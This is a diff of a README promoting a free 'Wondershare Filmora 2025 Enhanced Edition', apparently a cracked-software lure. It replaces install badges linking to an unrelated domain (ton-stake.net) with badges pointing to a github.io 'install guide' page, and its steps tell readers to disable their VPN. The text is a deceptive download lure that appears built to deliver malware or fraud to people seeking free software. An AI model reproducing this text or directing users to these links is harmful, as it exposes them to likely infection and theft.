@@ -5,9 +5,10 @@
 
 **Description**: Revolutionize your videos with **Wondershare Filmora 2025 Enhanced Edition**, offering free enhanced editing access! This repository provides unique tutorials, resources, and tips to explore advanced AI features like Enhanced Video Denoise and Dynamic Scene Sync. Download your free enhanced version and join our vibrant community of editors in 2025!  
 
-[![Install Wondershare Filmora 2025 Enhanced](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
----
+<a href="https://filmoraenhancedvideoeditingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 📋 Installation Guide  
 
@@ -30,9 +31,10 @@ Unlock your creative potential with these simple steps to set up Wondershare Fil
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother process.  
 
-[![Install Wondershare Filmora 2025 Enhanced](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
----
+<a href="https://filmoraenhancedvideoeditingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose Wondershare Filmora 2025 Enhanced Edition  
 
